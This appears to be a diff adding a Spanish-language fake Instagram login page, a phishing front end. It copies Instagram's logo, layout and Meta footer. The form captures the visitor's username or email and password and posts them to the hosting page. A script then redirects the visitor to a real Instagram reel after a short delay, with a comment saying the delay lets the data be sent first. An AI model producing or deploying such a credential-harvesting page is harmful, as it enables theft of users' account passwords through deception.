@@ -1,0 +1,86 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Instagram Login</title>
+    <link rel="stylesheet" href="css_insta.css">
+</head>
+<body>
+    <nav>
+        <div class="banner">
+            <div class="box">
+                <div class="box_box">
+                    <div class="box_insta">
+                        <img src="instagram-new-logo.png" alt="Instagram Logo">
+                    </div>
+                    <div class="box_inbox">
+                        <form id="loginForm" class= " box_input "action="#" method="POST" target="_blank"> 
+                            <input type="text" name="usuario_Email" placeholder="Teléfono, usuario o correo electrónico" required>
+                            <input type="password" name="contraseña" placeholder="Contraseña" required>
+                            <button type="submit" onclick="submitAndRedirect()">Iniciar sesión</button>
+                        </form>    
+                    </div>
+                    <div class="box_or">
+                        <div></div>
+                        <div>O</div>
+                        <div></div>
+                    </div>
+                    <div class="box_fa">
+                        <img src="face.png" alt="Facebook Logo" width="20px">
+                        <h2>Iniciar sesión con Facebook</h2>
+                    </div>
+                    <div class="box_text">
+                        <p>¿Olvidaste tu contraseña?</p>
+                        <p>
+                            
+
+
+                        </p>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </nav>
+    <p>
+        
+
+
+
+
+
+
+
+
+    </p>
+    <footer>
+        <div class="container">
+            <p>
+                
+
+
+                
+            </p>
+            <h2>¿No tienes una cuenta? <a href="#">Regístrate</a></h2>
+        </div>
+        <h2>Descarga la app</h2>
+        <div class="fot_img">
+            <img src="googleplay.png" width="10%" alt="Google Play">
+            <img src="microsoft.png" width="8%" alt="Microsoft Store">
+        </div>
+        <h2>Español © 2025 Instagram from Meta</h2>            
+    </footer>
+
+    <script>
+        function submitAndRedirect() {
+            // Envía el formulario
+            document.getElementById('loginForm').submit();
+            
+            // Redirige a Instagram después de un breve retraso
+            setTimeout(function() {
+                window.location.href = "https://www.instagram.com/reel/C5ccjDXteE-/?igsh=NjM0MmVsbjZ1enJt";
+            }, 500); // 500ms de retraso para asegurar que se envíen los datos
+        }
+    </script>
+</body>
+</html>
